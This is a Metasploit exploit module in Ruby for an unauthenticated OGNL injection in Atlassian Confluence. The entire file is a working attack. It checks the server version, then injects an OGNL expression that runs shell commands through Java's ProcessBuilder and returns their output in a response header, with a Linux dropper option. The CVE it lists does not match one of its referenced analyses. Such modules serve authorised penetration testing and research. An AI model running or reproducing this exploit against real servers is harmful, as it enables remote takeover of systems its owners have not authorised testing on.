##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Atlassian Confluence Namespace OGNL Injection',
        'Description' => %q{
          This module exploits an OGNL injection in Atlassian Confluence servers. A specially crafted URI can be used to
          evaluate an OGNL expression resulting in OS command execution.
        },
        'Author' => [
          'Unknown', # exploited in the wild
          'bturner-r7',
          'jbaines-r7',
          'Spencer McIntyre'
        ],
        'References' => [
          ['CVE', '2021-26084'],
          ['URL', 'https://gist.githubusercontent.com/bturner-r7/1d0b62fac85235b94f1c95cc4c03fcf3/raw/478e53b6f68b5150eefd53e0956f23d53618d250/confluence-exploit.py'],
          ['URL', 'https://github.com/jbaines-r7/through_the_wire'],
          ['URL', 'https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis']
        ],
        'DisclosureDate' => '2022-06-02',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :dropper
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8090
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    version = get_confluence_version
    return CheckCode::Unknown unless version

    header = "X-#{Rex::Text.rand_text_alphanumeric(10..15)}"
    res = inject_ognl('', header: header) # empty command works for testing, the header will be set

    return CheckCode::Unknown unless res

    unless res && res.headers.include?(header)
      # version 7.15 is technically vulnerable to the OGNL injection but not exploitable
      return CheckCode::Detected("Detected Confluence version: #{version}") if version >= Rex::Version.new('7.15')

      return CheckCode::Safe('Failed to test OGNL injection.')
    end

    vprint_status("Response header: #{res.headers[header]}")
    CheckCode::Vulnerable('Successfully tested OGNL injection.')
  end

  def get_confluence_version
    return @confluence_version if @confluence_version

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login.action')
    )
    return nil unless res&.code == 200

    poweredby = res.get_xml_document.xpath('//ul[@id="poweredby"]/li[@class="print-only"]/text()').first&.text
    return nil unless poweredby =~ /Confluence (\d+(\.\d+)*)/

    @confluence_version = Rex::Version.new(Regexp.last_match(1))
    @confluence_version
  end

  def exploit
    version = get_confluence_version
    fail_with(Failure::Unknown, 'Failed to fingerprint the target server.') unless version
    fail_with(Failure::NoTarget, "Confluence version #{version} is not exploitable.") if version >= Rex::Version.new('7.15')

    print_status("Executing #{payload_instance.refname} (#{target.name})")

    case target['Type']
    when :cmd
      execute_command(payload.encoded)
    when :dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    header = "X-#{Rex::Text.rand_text_alphanumeric(10..15)}"
    res = inject_ognl(cmd, header: header)

    unless res && res.headers.include?(header)
      fail_with(Failure::PayloadFailed, "Failed to execute command: #{cmd}")
    end

    vprint_good("Successfully executed command: #{cmd}")
    res.headers[header]
  end

  def encode_ognl(ognl)
    # Check and fail if the command contains the follow bad characters:
    #   ';' seems to terminates the OGNL statement
    #   '/' causes the target to return an HTTP/400 error
    #   '\' causes the target to return an HTTP/400 error (sometimes?)
    #   '\r' ends the GET request prematurely
    #   '\n' ends the GET request prematurely

    bad_chars = %w[; \\ \r \n] # and maybe '/'
    bad_chars.each do |c|
      if ognl.include? c
        print_error("Bad OGNL request: #{ognl}")
        fail_with(Failure::BadConfig, "OGNL request cannot contain a '#{c}'")
      end
    end

    # The following list of characters *must* be encoded or ORNL will asplode
    encodable_chars = {
      "%": '%25', # Always do this one first.  :-)
      " ": '%20',
      '"': '%22',
      "#": '%23',
      "'": '%27',
      "<": '%3c',
      ">": '%3e',
      "?": '%3f',
      "^": '%5e',
      "`": '%60',
      "{": '%7b',
      "|": '%7c',
      "}": '%7d'
    }
    # "\/":"%2f",       # Don't do this.  Just leave it front-slashes in as normal.
    # ";": "%3b",       # Doesn't work.  Anyone have a cool idea for a workaround?
    # "\\":"%5c",       # Doesn't work.  Anyone have a cool idea for a workaround?
    # "\\":"%5c%5c",    # Doesn't work.  Anyone have a cool idea for a workaround?

    encodable_chars.each do |k, v|
      ognl.tr!(k.to_s, v)
    end

    ognl
  end

  def inject_ognl(cmd, header:)
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, encode_ognl(ognl_payload(cmd, header: header)), 'dashboard.action'),
      'headers' => { header => cmd }
    )
  end

  def ognl_payload(_cmd, header:)
    <<~OGNL.gsub(/^\s+/, '').tr("\n", '')
      ${
        (#a=Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('
          new java.lang.ProcessBuilder(
            #{target['Platform'] == 'win' ? '"cmd.exe","/c"' : '"/bin/sh","-c"'},
            com.opensymphony.webwork.ServletActionContext.getRequest().getHeader("#{header}")
          ).start()
        ')).(
          @com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("#{header}",#a)
        )
      }
    OGNL
  end
end
